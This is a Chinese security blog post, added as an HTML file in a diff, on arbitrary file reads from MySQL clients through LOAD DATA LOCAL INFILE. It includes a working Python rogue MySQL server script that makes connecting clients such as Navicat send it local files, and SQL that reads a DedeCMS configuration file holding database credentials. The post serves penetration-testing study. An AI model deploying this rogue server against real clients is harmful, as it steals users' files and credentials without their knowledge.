@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>MySQL客户端任意文件读取 ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">MySQL客户端任意文件读取</h1>
+        <p class="text-center"><b>Monday, January 20th 2020, 2:15 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p>
+<p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p>
+<h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p>
+<p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p>
+<p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p>
+<p>受到<code>secure_file_priv</code>的导入导出限制。</p>
+<p>但是使用<code>load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></p>
+<p>就会把客户端的文件读取到服务端，并且不再受到<code>secure_file_priv</code>的导入导出限制。</p>
+<p><img src="/images/2020/01/20/f1b88850-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162253456.png"></p>
+<p>也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。</p>
+<h3 id="请求协议分析"><a href="#请求协议分析" class="headerlink" title="请求协议分析"></a>请求协议分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>先发送一个Greeting请求包，获取一些server信息。</p>
+<p><img src="/images/2020/01/20/f8566920-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162658492.png"></p>
+<p>接着会发送一个认证请求包，包含账号密码</p>
+<p><img src="/images/2020/01/20/fc5c6100-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162740414.png"></p>
+<p>后面会再接着发送一些查询请求，获取一些设置和编码信息等。</p>
+<p><img src="/images/2020/01/20/031061e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162840532.png"></p>
+<h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句</p>
+<p><img src="/images/2020/01/20/0767ae10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162935498.png"></p>
+<p>第二条是服务端返回了加载的文件地址给客户端</p>
+<p><img src="/images/2020/01/20/0b95ee70-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163231329.png"></p>
+<p>第三条就是客户端根据返回的地址读取文件，发送给服务端</p>
+<p><img src="/images/2020/01/20/1063ca30-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163522298.png"></p>
+<p>所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。</p>
+<p>而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。</p>
+<p>那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文</p>
+<p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p>
+<p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p>
+<h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p>
+<pre><code>#coding=utf-8 
+import socket
+import logging
+logging.basicConfig(level=logging.DEBUG)
+
+filename=&quot;C:\\Windows\\win.ini&quot;
+sv=socket.socket()
+sv.bind((&quot;&quot;,3306))
+sv.listen(5)
+conn,address=sv.accept()
+logging.info(&#39;Conn from: %r&#39;, address)
+conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)
+conn.recv(9999)
+logging.info(&quot;auth okay&quot;)
+conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)
+conn.recv(9999)
+logging.info(&quot;want file...&quot;)
+wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
+conn.sendall(wantfile)
+content=conn.recv(9999)
+logging.info(content)
+conn.close()
+</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p>
+<p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p>
+<p>python2的MySQLdb</p>
+<p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p>
+<p>不过在测试中发现python3的pymysql确不受影响</p>
+<p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p>
+<h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p>
+<pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;
+</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p>
+<pre><code>select * from dede_log;
+</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p>
+<p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p>
+<p>先更改数据库</p>
+<pre><code>use test;
+load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;
+select * from test.test;
+</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/01/MySQL客户端任意文件读取/">/2020/01/MySQL客户端任意文件读取/</a>
+                    <p>发表日期：<a href="/2020/01/MySQL客户端任意文件读取/">January 20th 2020, 2:15:08 pm</a>
+                    <p>更新日期：<a href="/2020/01/MySQL客户端任意文件读取/">January 20th 2020, 2:15:08 pm</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;渗透测试</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/01/MySQL客户端任意文件读取/'; 
+            this.page.identifier = '/2020/01/MySQL客户端任意文件读取/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
